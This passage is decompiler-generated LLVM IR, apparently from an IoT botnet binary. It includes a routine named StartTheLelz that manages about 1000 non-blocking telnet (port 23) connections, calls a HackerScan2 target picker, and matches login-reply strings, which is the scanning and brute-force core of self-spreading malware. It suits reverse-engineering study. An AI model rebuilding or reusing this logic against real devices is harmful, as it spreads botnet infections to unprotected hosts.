  store i32 0, i32* %v7_dc68, align 4
  %v1_dc70 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_dc70, 32
  br i1 %tmp21, label %dec_label_pc_dc5c, label %dec_label_pc_dc84

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dc5c
  %v13_dc1c = ptrtoint i32* %stack_var_-16 to i32
  %v3_dc88 = udiv i32 %arg1, 32
  %v3_dc94 = mul nuw nsw i32 %v3_dc88, 4
  %v2_dc9c = add nsw i32 %v3_dc94, -136
  %v2_dca0 = add i32 %v2_dc9c, %v13_dc1c
  %v1_dca4 = inttoptr i32 %v2_dca0 to i32*
  %v2_dca4 = load i32, i32* %v1_dca4, align 4
  %v1_dcac = urem i32 %arg1, 32
  %v6_dcb4 = shl i32 1, %v1_dcac
  %v2_dcb8 = or i32 %v2_dca4, %v6_dcb4
  store i32 %v2_dcb8, i32* %v1_dca4, align 4
  %v1_dcd8 = add i32 %arg1, 1
  %v2_dce0 = ptrtoint i32* %stack_var_-160 to i32
  %v5_dcf4 = call i32 @__libc_select(i32 %v1_dcd8, i32 %v2_dc48, i32 0, i32 0, i32 %v2_dce0)
  %v5_dd00 = icmp sgt i32 %v5_dcf4, 0
  br i1 %v5_dd00, label %dec_label_pc_dd10, label %dec_label_pc_dd04

dec_label_pc_dd04:                                ; preds = %dec_label_pc_dc84
  br label %dec_label_pc_dd30

dec_label_pc_dd10:                                ; preds = %dec_label_pc_dc84
  %v5_dd24 = inttoptr i32 %arg3 to i32*
  %v6_dd24 = call i32 @__libc_recv(i32 %arg1, i32* %v5_dd24, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dd30

dec_label_pc_dd30:                                ; preds = %dec_label_pc_dd04, %dec_label_pc_dd10
  %storemerge = phi i32 [ %v6_dd24, %dec_label_pc_dd10 ], [ 0, %dec_label_pc_dd04 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_dc48, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_dd30, { 1, 0 }
  uselistorder label %dec_label_pc_dc5c, { 1, 0 }
}

define i32 @contains_success(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_dd44 = load i32, i32* @fp, align 4
  %v3_dd5c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([4 x i8*]* @global_var_2b188.486 to i32))
  store i32 %v3_dd44, i32* @fp, align 4
  ret i32 %v3_dd5c
}

define i32 @contains_fail(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_dd74 = load i32, i32* @fp, align 4
  %v3_dd8c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_2b168.495 to i32))
  store i32 %v3_dd74, i32* @fp, align 4
  ret i32 %v3_dd8c

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_ddd0

dec_label_pc_ddd0:                                ; preds = %dec_label_pc_ddd0, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_ddd4, %dec_label_pc_ddd0 ]
  %v1_ddd4 = add i32 %stack_var_-24.0, 1
  %v3_dde0 = mul i32 %v1_ddd4, 4
  %v2_ddec = add i32 %v3_dde0, %arg2
  %v1_ddf0 = inttoptr i32 %v2_ddec to i32*
  %v2_ddf0 = load i32, i32* %v1_ddf0, align 4
  %v2_ddf4 = icmp eq i32 %v2_ddf0, 0
  br i1 %v2_ddf4, label %dec_label_pc_de50.preheader, label %dec_label_pc_ddd0

dec_label_pc_de50.preheader:                      ; preds = %dec_label_pc_ddd0
  %v3_de28 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_de50

dec_label_pc_de08:                                ; preds = %dec_label_pc_de50
  %v3_de0c = mul i32 %storemerge2, 4
  %v2_de18 = add i32 %v3_de0c, %arg2
  %v1_de1c = inttoptr i32 %v2_de18 to i32*
  %v2_de1c = load i32, i32* %v1_de1c, align 4
  %v4_de28 = call i32 @strcasestr(i8* %v3_de28, i32 %v2_de1c, i32 %v3_de0c)
  %v2_de30 = icmp eq i32 %v4_de28, 0
  %v1_de48 = add nuw i32 %storemerge2, 1
  br i1 %v2_de30, label %dec_label_pc_de50, label %dec_label_pc_de68

dec_label_pc_de50:                                ; preds = %dec_label_pc_de08, %dec_label_pc_de50.preheader
  %storemerge2 = phi i32 [ %v1_de48, %dec_label_pc_de08 ], [ 0, %dec_label_pc_de50.preheader ]
  %v5_de5c = icmp slt i32 %storemerge2, %v1_ddd4
  br i1 %v5_de5c, label %dec_label_pc_de08, label %dec_label_pc_de68

dec_label_pc_de68:                                ; preds = %dec_label_pc_de50, %dec_label_pc_de08
  %storemerge3 = phi i32 [ 1, %dec_label_pc_de08 ], [ 0, %dec_label_pc_de50 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_ddd4, { 1, 0, 2 }
}

define i32 @StartTheLelz() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-616 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_de78 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_de78, i32* %ip.global-to-local, align 4
  %v3_de7c = load i32, i32* @r4, align 4
  store i32 %v3_de7c, i32* %stack_var_-24, align 4
  store i32 56964, i32* %stack_var_-4, align 4
  %v2_de80 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_de80, i32* @fp, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_dea4 = call i32 @__GI_time(i32* null)
  store i32 %v2_dea4, i32* %r3.global-to-local, align 4
  store i32 %v2_dea4, i32* @r4, align 4
  %v0_deb0 = call i32 @rand_cmwc()
  %v0_deb8 = load i32, i32* @r4, align 4
  %v2_deb8 = xor i32 %v0_deb8, %v0_deb0
  store i32 %v2_deb8, i32* %r3.global-to-local, align 4
  %v1_dec0 = call i32 @srand(i32 %v2_deb8)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-616, align 4
  %v1_ded8 = call i32 @htons(i32 23)
  %v2_def0 = ptrtoint i32* %stack_var_-608 to i32
  store i32 %v2_def0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-608, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_df0c = call i32 @malloc(i32 1025)
  store i32 1025, i32* %r3.global-to-local, align 4
  store i32 1025, i32* @r2, align 4
  %v2_df34 = inttoptr i32 %v1_df0c to i8*
  %v3_df34 = call i32 @__GI_memset(i8* %v2_df34, i32 0)
  %v1_df58 = load i32, i32* @sp, align 4
  %v1_df68 = add i32 %v1_df58, -27997
  %v3_df6c = and i32 %v1_df68, -4
  store i32 5000, i32* %r3.global-to-local, align 4
  store i32 5000, i32* @r2, align 4
  %v2_dfa4 = inttoptr i32 %v3_df6c to i8*
  %v3_dfa4 = call i32 @__GI_memset(i8* %v2_dfa4, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dfb4

dec_label_pc_dfb4:                                ; preds = %entry, %dec_label_pc_dfb4
  %storemerge514 = phi i32 [ 0, %entry ], [ %v1_e070, %dec_label_pc_dfb4 ]
  %v2_dfc4 = mul nuw nsw i32 %storemerge514, 28
  %v2_dfc8 = add i32 %v2_dfc4, %v3_df6c
  store i32 %v2_dfc8, i32* %r3.global-to-local, align 4
  %v2_dfd0 = inttoptr i32 %v2_dfc8 to i32*
  store i32 0, i32* %v2_dfd0, align 4
  %v0_dfd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_dfd4 = add i32 %v0_dfd4, 4
  store i32 %v1_dfd4, i32* %r3.global-to-local, align 4
  %v2_dfdc = inttoptr i32 %v1_dfd4 to i32*
  store i32 0, i32* %v2_dfdc, align 4
  %v0_dfe0 = load i32, i32* %r3.global-to-local, align 4
  %v1_dfe0 = add i32 %v0_dfe0, 4
  store i32 %v1_dfe0, i32* %r3.global-to-local, align 4
  %v2_dfe8 = inttoptr i32 %v1_dfe0 to i32*
  store i32 0, i32* %v2_dfe8, align 4
  %v0_dfec = load i32, i32* %r3.global-to-local, align 4
  %v1_dfec = add i32 %v0_dfec, 4
  store i32 %v1_dfec, i32* %r3.global-to-local, align 4
  %v2_dff4 = inttoptr i32 %v1_dfec to i32*
  store i32 0, i32* %v2_dff4, align 4
  %v0_dff8 = load i32, i32* %r3.global-to-local, align 4
  %v1_dff8 = add i32 %v0_dff8, 4
  store i32 %v1_dff8, i32* %r3.global-to-local, align 4
  %v2_e000 = inttoptr i32 %v1_dff8 to i32*
  store i32 0, i32* %v2_e000, align 4
  %v0_e004 = load i32, i32* %r3.global-to-local, align 4
  %v1_e004 = add i32 %v0_e004, 4
  store i32 %v1_e004, i32* %r3.global-to-local, align 4
  %v2_e00c = inttoptr i32 %v1_e004 to i32*
  store i32 0, i32* %v2_e00c, align 4
  %v0_e010 = load i32, i32* %r3.global-to-local, align 4
  %v1_e010 = add i32 %v0_e010, 4
  %v2_e018 = inttoptr i32 %v1_e010 to i32*
  store i32 0, i32* %v2_e018, align 4
  %v3_e040 = add i32 %v2_dfc8, 9
  %v4_e040 = inttoptr i32 %v3_e040 to i8*
  store i8 1, i8* %v4_e040, align 1
  %v2_e060 = add i32 %v2_dfc8, 24
  %v2_e068 = inttoptr i32 %v2_e060 to i32*
  store i32 %v1_df0c, i32* %v2_e068, align 4
  %v1_e070 = add nuw nsw i32 %storemerge514, 1
  store i32 %v1_e070, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v5_e084 = icmp slt i32 %v1_e070, 1000
  br i1 %v5_e084, label %dec_label_pc_dfb4, label %dec_label_pc_e088.preheader

dec_label_pc_e088.preheader:                      ; preds = %dec_label_pc_dfb4
  %v19_de7c = ptrtoint i32* %stack_var_-24 to i32
  %v2_e110 = add i32 %v3_df6c, 8
  %v2_e444 = add i32 %v3_df6c, 4
  %v3_e534 = bitcast i32* %stack_var_-616 to %sockaddr*
  %v2_e5fc = ptrtoint i32* %stack_var_-328 to i32
  %v2_e6f8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_e754 = ptrtoint i32* %stack_var_-344 to i32
  %v2_e758 = ptrtoint i32* %stack_var_-340 to i32
  %v2_e8c4 = add i32 %v3_df6c, 24
  %v2_f42c = add i32 %v3_df6c, 16
  br label %dec_label_pc_e088

dec_label_pc_e088:                                ; preds = %dec_label_pc_f660, %dec_label_pc_e088.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e094

dec_label_pc_e094:                                ; preds = %dec_label_pc_e088, %dec_label_pc_f660
  %storemerge612 = phi i32 [ 0, %dec_label_pc_e088 ], [ %v1_f664, %dec_label_pc_f660 ]
  %v3_e0a0 = mul i32 %storemerge612, 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e0a8 = mul nuw nsw i32 %storemerge612, 28
  %v2_e0ac = add i32 %v2_e0a8, %v3_df6c
  %v2_e0b0 = add i32 %v2_e0ac, 16
  store i32 %v2_e0b0, i32* %r3.global-to-local, align 4
  %v1_e0b4 = inttoptr i32 %v2_e0b0 to i32*
  %v2_e0b4 = load i32, i32* %v1_e0b4, align 4
  store i32 %v2_e0b4, i32* %r3.global-to-local, align 4
  %v2_e0b8 = icmp eq i32 %v2_e0b4, 0
  br i1 %v2_e0b8, label %dec_label_pc_e0c0, label %dec_label_pc_e0f8

dec_label_pc_e0c0:                                ; preds = %dec_label_pc_e094
  store i32 %storemerge612, i32* @r4, align 4
  %v2_e0c8 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_e0dc = load i32, i32* @r4, align 4
  %v3_e0e0 = mul i32 %v0_e0dc, 4
  store i32 %v3_e0e0, i32* %r2.global-to-local, align 4
  %v2_e0e8 = mul i32 %v0_e0dc, 28
  %v2_e0f0 = add i32 %v2_f42c, %v2_e0e8
  store i32 %v2_e0f0, i32* %r3.global-to-local, align 4
  %v2_e0f4 = inttoptr i32 %v2_e0f0 to i32*
  store i32 %v2_e0c8, i32* %v2_e0f4, align 4
  br label %dec_label_pc_e0f8

dec_label_pc_e0f8:                                ; preds = %dec_label_pc_e094, %dec_label_pc_e0c0
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e114 = add i32 %v2_e110, %v2_e0a8
  store i32 %v2_e114, i32* %r3.global-to-local, align 4
  %v1_e118 = inttoptr i32 %v2_e114 to i8*
  %v2_e118 = load i8, i8* %v1_e118, align 4
  %v3_e118 = sext i8 %v2_e118 to i32
  %v4_e118 = zext i8 %v2_e118 to i32
  store i32 %v4_e118, i32* %r3.global-to-local, align 4
  switch i32 %v3_e118, label %dec_label_pc_f660 [
    i32 0, label %dec_label_pc_e148
    i32 1, label %dec_label_pc_e610.lr.ph
    i32 2, label %dec_label_pc_ea44
    i32 3, label %dec_label_pc_ebc8
    i32 4, label %dec_label_pc_ed80
    i32 5, label %dec_label_pc_ef04
    i32 6, label %dec_label_pc_f0bc
    i32 7, label %dec_label_pc_f4a4
  ]

dec_label_pc_e148:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e164 = add i32 %v2_e0ac, 8
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v1_e168 = add i32 %v2_e0ac, 9
  %v2_e168 = inttoptr i32 %v1_e168 to i8*
  %v3_e168 = load i8, i8* %v2_e168, align 1
  %v7_e16c = icmp eq i8 %v3_e168, 1
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v7_e16c, label %dec_label_pc_e174, label %dec_label_pc_e260

dec_label_pc_e174:                                ; preds = %dec_label_pc_e148
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e190 = add i32 %v2_e0ac, 24
  store i32 %v2_e190, i32* %r3.global-to-local, align 4
  %v1_e194 = inttoptr i32 %v2_e190 to i32*
  %v2_e194 = load i32, i32* %v1_e194, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e1b8 = inttoptr i32 %v2_e0ac to i32*
  store i32 0, i32* %v2_e1b8, align 4
  %v0_e1bc = load i32, i32* %r3.global-to-local, align 4
  %v1_e1bc = add i32 %v0_e1bc, 4
  store i32 %v1_e1bc, i32* %r3.global-to-local, align 4
  %v2_e1c4 = inttoptr i32 %v1_e1bc to i32*
  store i32 0, i32* %v2_e1c4, align 4
  %v0_e1c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1c8 = add i32 %v0_e1c8, 4
  store i32 %v1_e1c8, i32* %r3.global-to-local, align 4
  %v2_e1d0 = inttoptr i32 %v1_e1c8 to i32*
  store i32 0, i32* %v2_e1d0, align 4
  %v0_e1d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1d4 = add i32 %v0_e1d4, 4
  store i32 %v1_e1d4, i32* %r3.global-to-local, align 4
  %v2_e1dc = inttoptr i32 %v1_e1d4 to i32*
  store i32 0, i32* %v2_e1dc, align 4
  %v0_e1e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1e0 = add i32 %v0_e1e0, 4
  store i32 %v1_e1e0, i32* %r3.global-to-local, align 4
  %v2_e1e8 = inttoptr i32 %v1_e1e0 to i32*
  store i32 0, i32* %v2_e1e8, align 4
  %v0_e1ec = load i32, i32* %r3.global-to-local, align 4
  %v1_e1ec = add i32 %v0_e1ec, 4
  store i32 %v1_e1ec, i32* %r3.global-to-local, align 4
  %v2_e1f4 = inttoptr i32 %v1_e1ec to i32*
  store i32 0, i32* %v2_e1f4, align 4
  %v0_e1f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1f8 = add i32 %v0_e1f8, 4
  %v2_e200 = inttoptr i32 %v1_e1f8 to i32*
  store i32 0, i32* %v2_e200, align 4
  store i32 %v2_e190, i32* %r2.global-to-local, align 4
  store i32 %v2_e194, i32* %r3.global-to-local, align 4
  store i32 %v2_e194, i32* %v1_e194, align 4
  store i32 %storemerge612, i32* @r4, align 4
  %v1_e230 = call i32 @HackerScan2(i32 24)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_e240 = load i32, i32* @r4, align 4
  %v3_e244 = mul i32 %v0_e240, 4
  store i32 %v3_e244, i32* %r2.global-to-local, align 4
  %v2_e24c = mul i32 %v0_e240, 28
  %v2_e254 = add i32 %v2_e444, %v2_e24c
  store i32 %v2_e254, i32* %r3.global-to-local, align 4
  %v2_e258 = inttoptr i32 %v2_e254 to i32*
  store i32 %v1_e230, i32* %v2_e258, align 4
  br label %dec_label_pc_e3ec

dec_label_pc_e260:                                ; preds = %dec_label_pc_e148
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v3_e280 = load i8, i8* %v2_e168, align 1
  %v4_e280 = zext i8 %v3_e280 to i32
  store i32 %v4_e280, i32* %r3.global-to-local, align 4
  %v2_e284 = icmp eq i8 %v3_e280, 0
  br i1 %v2_e284, label %dec_label_pc_e28c, label %dec_label_pc_e3ec

dec_label_pc_e28c:                                ; preds = %dec_label_pc_e260
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v1_e2b0 = add i32 %v2_e0ac, 11
  %v2_e2b0 = inttoptr i32 %v1_e2b0 to i8*
  %v3_e2b0 = load i8, i8* %v2_e2b0, align 1
  %v1_e2b4 = add i8 %v3_e2b0, 1
  store i8 %v1_e2b4, i8* %v2_e2b0, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v1_e308 = add i32 %v2_e0ac, 10
  %v2_e308 = inttoptr i32 %v1_e308 to i8*
  %v3_e308 = load i8, i8* %v2_e308, align 2
  %v1_e30c = add i8 %v3_e308, 1
  store i32 %v3_df6c, i32* %ip.global-to-local, align 4
  store i8 %v1_e30c, i8* %v2_e308, align 2
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v3_e35c = load i8, i8* %v2_e2b0, align 1
  %v7_e360 = icmp eq i8 %v3_e35c, 22
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  br i1 %v7_e360, label %dec_label_pc_e368, label %dec_label_pc_e394

dec_label_pc_e368:                                ; preds = %dec_label_pc_e28c
  store i32 %v2_e164, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e168, align 1
  br label %dec_label_pc_f660

dec_label_pc_e394:                                ; preds = %dec_label_pc_e28c
  store i32 %v2_e164, i32* %r3.global-to-local, align 4
  %v3_e3b4 = load i8, i8* %v2_e308, align 2
  %v4_e3b4 = zext i8 %v3_e3b4 to i32
  store i32 %v4_e3b4, i32* %r3.global-to-local, align 4
  %v7_e3b8 = icmp eq i8 %v3_e3b4, 22
  br i1 %v7_e3b8, label %dec_label_pc_e3c0, label %dec_label_pc_e3ec

dec_label_pc_e3c0:                                ; preds = %dec_label_pc_e394
  store i32 %v2_e164, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e168, align 1
  br label %dec_label_pc_f660

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e394, %dec_label_pc_e260, %dec_label_pc_e174
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-616, align 4
  %v1_e400 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-608, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e448 = add i32 %v2_e444, %v2_e0a8
  store i32 %v2_e448, i32* %r3.global-to-local, align 4
  %v1_e44c = inttoptr i32 %v2_e448 to i32*
  %v2_e44c = load i32, i32* %v1_e44c, align 4
  store i32 %v2_e44c, i32* %r3.global-to-local, align 4
  store i32 %storemerge612, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_e464 = call i32 @socket()
  %v0_e46c = load i32, i32* @r4, align 4
  %v2_e478 = mul i32 %v0_e46c, 28
  %v2_e47c = add i32 %v2_e478, %v3_df6c
  %v2_e480 = inttoptr i32 %v2_e47c to i32*
  store i32 %v0_e464, i32* %v2_e480, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_e49c = inttoptr i32 %v2_e0ac to i32*
  %v2_e49c = load i32, i32* %v1_e49c, align 4
  store i32 %v2_e49c, i32* %r3.global-to-local, align 4
  %v7_e4a0 = icmp eq i32 %v2_e49c, -1
  br i1 %v7_e4a0, label %dec_label_pc_f660, label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e3ec
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e4c0 = load i32, i32* %v1_e49c, align 4
  store i32 %v2_e4c0, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e4dc = load i32, i32* %v1_e49c, align 4
  store i32 %v2_e4dc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_e4ec = call i32 @__libc_fcntl(i32 %v2_e4dc, i32 3)
  %v1_e4f4 = or i32 %v2_e4ec, 2048
  store i32 %v1_e4f4, i32* %r3.global-to-local, align 4
  %v0_e4f8 = load i32, i32* @r4, align 4
  store i32 %v1_e4f4, i32* @r2, align 4
  %v2_e504 = call i32 @__libc_fcntl(i32 %v0_e4f8, i32 4)
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e520 = load i32, i32* %v1_e49c, align 4
  store i32 %v2_e520, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_e534 = call i32 @__libc_connect(i32 %v2_e520, %sockaddr* nonnull %v3_e534, i32 16)
  store i32 %v4_e534, i32* %r3.global-to-local, align 4
  %v3_e53c = icmp eq i32 %v4_e534, -1
  br i1 %v3_e53c, label %dec_label_pc_e544, label %dec_label_pc_e5a8

dec_label_pc_e544:                                ; preds = %dec_label_pc_e4a8
  %v0_e544 = call i32 @__errno_location()
  store i32 %v0_e544, i32* %r3.global-to-local, align 4
  %v1_e54c = inttoptr i32 %v0_e544 to i32*
  %v2_e54c = load i32, i32* %v1_e54c, align 4
  store i32 %v2_e54c, i32* %r3.global-to-local, align 4
  %v7_e550 = icmp eq i32 %v2_e54c, 115
  br i1 %v7_e550, label %dec_label_pc_e5a8, label %dec_label_pc_e558

dec_label_pc_e558:                                ; preds = %dec_label_pc_e544
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e570 = load i32, i32* %v1_e49c, align 4
  store i32 %v2_e570, i32* %r3.global-to-local, align 4
  %v3_e578 = call i32 @sclose(i32 %v2_e570, i32 %v3_df6c, i32 %v3_e0a0)
  store i32 %v2_e164, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e168, align 1
  br label %dec_label_pc_f660

dec_label_pc_e5a8:                                ; preds = %dec_label_pc_e4a8, %dec_label_pc_e544
  %v3_e5cc = inttoptr i32 %v2_e164 to i8*
  store i8 1, i8* %v3_e5cc, align 4
  store i32 %v2_e0b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %v1_e0b4, align 4
  br label %dec_label_pc_f660

dec_label_pc_e610.lr.ph:                          ; preds = %dec_label_pc_e0f8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e610

dec_label_pc_e610:                                ; preds = %dec_label_pc_e610.lr.ph, %dec_label_pc_e610
  %storemerge711 = phi i32 [ 0, %dec_label_pc_e610.lr.ph ], [ %v1_e624, %dec_label_pc_e610 ]
  store i32 %v2_e5fc, i32* %r2.global-to-local, align 4
  %v5_e61c = mul nuw nsw i32 %storemerge711, 4
  %v6_e61c = add i32 %v5_e61c, %v2_e5fc
  %v7_e61c = inttoptr i32 %v6_e61c to i32*
  store i32 0, i32* %v7_e61c, align 4
  %v1_e624 = add nuw nsw i32 %storemerge711, 1
  store i32 %v1_e624, i32* %r3.global-to-local, align 4
  %tmp47 = icmp ult i32 %v1_e624, 32
  br i1 %tmp47, label %dec_label_pc_e610, label %dec_label_pc_e638

dec_label_pc_e638:                                ; preds = %dec_label_pc_e610
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_e650 = inttoptr i32 %v2_e0ac to i32*
  %v2_e650 = load i32, i32* %v1_e650, align 4
  %v3_e654 = udiv i32 %v2_e650, 32
  %v3_e668 = mul nuw nsw i32 %v3_e654, 4
  %v2_e670 = add i32 %v3_e668, %v19_de7c
  store i32 %v2_e670, i32* %r2.global-to-local, align 4
  %v2_e674 = add i32 %v2_e670, -304
  store i32 %v2_e674, i32* %r3.global-to-local, align 4
  %v1_e678 = inttoptr i32 %v2_e674 to i32*
  %v2_e678 = load i32, i32* %v1_e678, align 4
  store i32 %v2_e678, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e694 = load i32, i32* %v1_e650, align 4
  %v1_e698 = urem i32 %v2_e694, 32
  %v6_e6a0 = shl i32 1, %v1_e698
  %v2_e6a4 = or i32 %v6_e6a0, %v2_e678
  store i32 %v2_e6a4, i32* %v1_e678, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e6ec = load i32, i32* %v1_e650, align 4
  %v1_e6f0 = add i32 %v2_e6ec, 1
  store i32 %v1_e6f0, i32* %r2.global-to-local, align 4
  store i32 %v2_e5fc, i32* %ip.global-to-local, align 4
  %v1_e6fc = load i32, i32* @sp, align 4
  %v2_e6fc = inttoptr i32 %v1_e6fc to i32*
  store i32 %v2_e6f8, i32* %v2_e6fc, align 4
  %v0_e700 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e5fc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_e710 = load i32, i32* %stack_var_-336, align 4
  %v5_e710 = call i32 @__libc_select(i32 %v0_e700, i32 0, i32 %v2_e5fc, i32 0, i32 %v4_e710)
  store i32 %v5_e710, i32* %r3.global-to-local, align 4
  %v7_e720 = icmp eq i32 %v5_e710, 1
  br i1 %v7_e720, label %dec_label_pc_e728, label %dec_label_pc_e90c

dec_label_pc_e728:                                ; preds = %dec_label_pc_e638
  store i32 4, i32* %stack_var_-340, align 4
  store i32 0, i32* %stack_var_-344, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e750 = load i32, i32* %v1_e650, align 4
  store i32 %v2_e750, i32* %r2.global-to-local, align 4
  store i32 %v2_e754, i32* %ip.global-to-local, align 4
  %v1_e75c = load i32, i32* @sp, align 4
  %v2_e75c = inttoptr i32 %v1_e75c to i32*
  store i32 %v2_e758, i32* %v2_e75c, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_e754, i32* %r3.global-to-local, align 4
  %v0_e770 = call i32 @getsockopt()
  %v3_e774 = load i32, i32* %stack_var_-344, align 4
  %v2_e778 = icmp eq i32 %v3_e774, 0
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e810 = load i32, i32* %v1_e650, align 4
  br i1 %v2_e778, label %dec_label_pc_e7f8, label %dec_label_pc_e780

dec_label_pc_e780:                                ; preds = %dec_label_pc_e728
  store i32 %v2_e810, i32* %r3.global-to-local, align 4
  %v3_e7a0 = call i32 @sclose(i32 %v2_e810, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_e7c0 = add i32 %v2_e0ac, 8
  %v3_e7c8 = inttoptr i32 %v2_e7c0 to i8*
  store i8 0, i8* %v3_e7c8, align 4
  store i32 %v2_e7c0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_e7f0 = add i32 %v2_e0ac, 9
  %v4_e7f0 = inttoptr i32 %v3_e7f0 to i8*
